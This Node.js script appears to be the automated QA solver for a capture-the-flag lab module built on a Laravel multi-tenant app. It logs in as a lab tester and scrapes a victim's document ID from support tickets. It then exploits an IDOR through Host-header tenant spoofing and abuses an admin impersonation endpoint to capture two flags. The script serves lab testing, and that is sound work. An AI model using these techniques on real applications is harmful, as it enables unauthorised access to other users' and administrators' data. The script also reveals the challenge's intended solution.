#!/usr/bin/env node
/*
 * VLH-CTF QA solver — ASLV M3 (aslv-app / Laravel), INTENDED PATH (FR-14).
 *
 * Both resource-resident flags (arch §7.0 M3):
 *   IDOR — /support/tickets is the legitimate leak point (the support desk
 *          sees every ticket; the innocent's ticket references her private
 *          document and her tenant subdomain). /api/documents/{uuid} performs
 *          a MISPLACED check: it validates the document's tenant against the
 *          HOST-DERIVED tenant, not the session owner — browsing via
 *          <innocent-tenant>.aslv.lab reads her document → ASLV{IDOR-...}
 *          (+ pivot material: innocent email, next hint).
 *   BAC  — /admin/users/impersonate checks the TARGET's role, never the
 *          CALLER's: any authenticated user impersonating ?user_id=admin
 *          receives the admin-only document → ASLV{BAC-...}.
 *
 * Laravel session auth (cookie jar) with X-XSRF-TOKEN echo for the CSRF-protected
 * login POST. Tenant Host-header virtual hosting for the IDOR step.
 *
 * Env: M3_URL (default http://localhost:18023 — m3 standalone sidecar).
 * Node 20+ built-ins only. Exit 0 only when BOTH flags are captured.
 */
import http from 'node:http';

const M3_URL = process.env.M3_URL || 'http://localhost:18023';
const BASE = new URL(M3_URL);
const PORT = Number(BASE.port || 80);
const NEUTRAL_HOST = `portal.aslv.lab:${PORT}`; // reserved subdomain → tenant-neutral pages
const IDOR_FLAG_RE = /ASLV\{IDOR-\d{9,10}\}/;
const BAC_FLAG_RE = /ASLV\{BAC-\d{9,10}\}/;
const UUID_RE = /[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/gi;
const SUBDOMAIN_RE = /([a-z0-9][a-z0-9-]{0,30})\.aslv\.lab/gi;
const RESERVED = new Set(['www', 'auth', 'mail', 'collector', 'attacker', 'edge', 'internal', 'app', 'api', 'portal', 'victim', 'stub', 'client']);

const log = (m) => console.log(`[*] ${m}`);
const ok = (m) => console.log(`[+] ${m}`);
const die = (m) => { console.error(`[-] ${m}`); process.exit(1); };

function request(method, path, { host, headers = {}, body, jar } = {}) {
  return new Promise((resolve, reject) => {
    const payload = body === undefined ? null
      : (typeof body === 'string' ? body : JSON.stringify(body));
    const h = { ...headers };
    if (host) h.host = host;
    if (payload !== null && !h['content-type']) {
      h['content-type'] = typeof body === 'string'
        ? 'application/x-www-form-urlencoded'
        : 'application/json';
    }
    if (jar && jar.size) h.cookie = [...jar.entries()].map(([k, v]) => `${k}=${v}`).join('; ');
    if (jar && jar.has('XSRF-TOKEN') && !h['x-xsrf-token']) {
      h['x-xsrf-token'] = decodeURIComponent(jar.get('XSRF-TOKEN'));
    }
    const req = http.request(
      { host: BASE.hostname, port: PORT, path, method, headers: h },
      (res) => {
        const chunks = [];
        res.on('data', (c) => chunks.push(c));
        res.on('end', () => {
          if (jar) {
            for (const c of res.headers['set-cookie'] || []) {
              const m = /([^=;]+)=([^;]*)/.exec(c);
              if (m) jar.set(m[1].trim(), m[2]);
            }
          }
          const text = Buffer.concat(chunks).toString('utf8');
          let json = null;
          try { json = JSON.parse(text); } catch (_) { /* html */ }
          resolve({ status: res.statusCode, headers: res.headers, text, json });
        });
      },
    );
    req.setTimeout(5000, () => req.destroy(new Error(`request timeout: ${method} ${path}`)));
    req.on('error', reject);
    if (payload !== null) req.write(payload);
    req.end();
  });
}

/* Extract the innocent's document uuid + tenant subdomain from the support
 * desk ticket list (the legitimate leak point). The view is HTML; we bind the
 * uuid to a usr_<hex> requester context and a <tenant>.aslv.lab mention. */
function parseTickets(html) {
  const uuids = [...new Set((html.match(UUID_RE) || []).map((s) => s.toLowerCase()))];
  if (uuids.length === 0) return null;
  const innocentUser = /usr_[0-9a-f]{4,16}/.exec(html)?.[0] || null;

  const scored = uuids.map((uuid) => {
    const idx = html.toLowerCase().indexOf(uuid);
    const winStart = Math.max(0, idx - 500);
    const win = html.slice(winStart, idx + uuid.length + 500);
    const tenants = [...new Set((win.match(SUBDOMAIN_RE) || [])
      .map((s) => s.replace(/\.aslv\.lab$/i, '').toLowerCase()))
    ].filter((t) => !RESERVED.has(t));
    let score = 0;
    if (/api\/documents\//i.test(win)) score += 2;
    if (innocentUser && win.includes(innocentUser)) score += 3;
    if (/usr_[0-9a-f]{4,16}/i.test(win)) score += 1;
    if (tenants.length) score += 1;
    return { uuid, tenants, score, nearInnocent: !!(innocentUser && win.includes(innocentUser)) };
  });
  scored.sort((a, b) => b.score - a.score);
  const best = scored[0];
  return { uuid: best.uuid, tenants: best.tenants, innocentUser };
}

async function main() {
  log(`M3 target: ${M3_URL} (neutral host: ${NEUTRAL_HOST})`);
  const flags = {};

  /* 1. fetch the login page (session + XSRF cookie) */
  const jar = new Map();
  const loginPage = await request('GET', '/login', { host: NEUTRAL_HOST, jar });
  if (loginPage.status !== 200) {
    die(`GET /login failed: ${loginPage.status} ${loginPage.text.slice(0, 200)} — is the m3 profile running?`);
  }
  ok(`login page acquired (cookies: ${[...jar.keys()].join(', ') || 'none'})`);

  /* 2. log in as the known tester (CSRF echo via X-XSRF-TOKEN header) */
  const form = new URLSearchParams({ username: '0xnhsec', password: 'vlh-tester-01' }).toString();
  let login = await request('POST', '/login', { host: NEUTRAL_HOST, jar, body: form });
  if (login.status === 419) {
    // retry with the form-embedded _token (in case the header echo is not honored)
    const token = /name="_token"\s+value="([^"]+)"/.exec(loginPage.text)?.[1];
    if (!token) die('login rejected (419) and no _token found in the login form');
    const form2 = new URLSearchParams({ _token: token, username: '0xnhsec', password: 'vlh-tester-01' }).toString();
    login = await request('POST', '/login', { host: NEUTRAL_HOST, jar, body: form2 });
  }
  if (login.status !== 302 || !String(login.headers.location || '').includes('dashboard')) {
    die(`tester login failed: ${login.status} loc=${login.headers.location || '-'} ${login.text.slice(0, 200)}`);
  }
  ok('logged in as 0xnhsec (session established)');

  /* 3. support desk — the legitimate leak point */
  const tickets = await request('GET', '/support/tickets', { host: NEUTRAL_HOST, jar });
  if (tickets.status !== 200) die(`GET /support/tickets failed: ${tickets.status} ${tickets.text.slice(0, 200)}`);
  const leak = parseTickets(tickets.text);
  if (!leak) {
    die(`no document uuid found in /support/tickets — excerpt: ${tickets.text.slice(0, 400)}`);
  }
  ok(`ticket leak: innocent=${leak.innocentUser || '(usr_ not shown)'} document=${leak.uuid} tenants=${leak.tenants.join(',') || '?'}`);

  /* 4. IDOR — browse the document from the innocent's TENANT subdomain (Host
   * header). The misplaced check compares the document tenant to the
   * host-derived tenant, so the tester session is granted read access. */
  const tenantCandidates = leak.tenants.length ? leak.tenants : [leak.innocentUser || 'tenant'];
  let idorDoc = null;
  let usedTenant = null;
  for (const tenant of tenantCandidates) {
    const tenantHost = `${tenant}.aslv.lab:${PORT}`;
    const r = await request('GET', `/api/documents/${leak.uuid}`, { host: tenantHost, jar });
    log(`IDOR attempt via ${tenantHost}: status ${r.status}`);
    if (r.status === 200 && r.json) {
      idorDoc = r.json;
      usedTenant = tenant;
      break;
    }
  }
  if (!idorDoc) {
    die(`could not read the innocent document via any tenant host (${tenantCandidates.join(', ')}) — see /support/tickets excerpt above`);
  }
  const idorFlag = IDOR_FLAG_RE.exec(JSON.stringify(idorDoc))?.[0]
    || IDOR_FLAG_RE.exec(idorDoc.body || '')?.[0]
    || IDOR_FLAG_RE.exec(idorDoc.pivot_hint || '')?.[0];
  if (!idorFlag) {
    die(`innocent document read succeeded but carried no ASLV{IDOR-...}: ${JSON.stringify(idorDoc).slice(0, 300)}`);
  }
  flags.IDOR = idorFlag;
  ok(`IDOR flag: ${flags.IDOR} (via Host: ${usedTenant}.aslv.lab)`);
  ok(`pivot material: ${String(idorDoc.pivot_hint || idorDoc.body || '').slice(0, 160)}`);

  /* 5. BAC — misplaced check: /admin/users/impersonate verifies the TARGET is
   * an admin, never the caller. Impersonate the admin, receive the admin-only
   * document. */
  const imp = await request('GET', '/admin/users/impersonate?user_id=admin', { host: NEUTRAL_HOST, jar });
  if (imp.status !== 200 || !imp.json) {
    die(`GET /admin/users/impersonate?user_id=admin failed: ${imp.status} ${imp.text.slice(0, 300)}`);
  }
  const bacFlag = BAC_FLAG_RE.exec(JSON.stringify(imp.json))?.[0];
  if (!bacFlag) {
    die(`impersonation succeeded but no ASLV{BAC-...} in the admin document: ${JSON.stringify(imp.json).slice(0, 300)}`);
  }
  flags.BAC = bacFlag;
  ok(`BAC flag: ${flags.BAC} (impersonated ${imp.json.impersonated} as a mere tester)`);

  console.log('\n=== M3 intended path: BOTH FLAGS ===');
  for (const [k, v] of Object.entries(flags)) console.log(`  ${k}: ${v}`);
  process.exit(0);
}

main().catch((e) => {
  if (e && (e.code === 'ECONNREFUSED' || e.code === 'ENOTFOUND')) {
    die(`cannot connect to ${M3_URL} (${e.code}) — is the m3 profile running?  docker compose --profile m3 up -d`);
  }
  die(`unexpected error: ${e && e.stack ? e.stack : e}`);
});
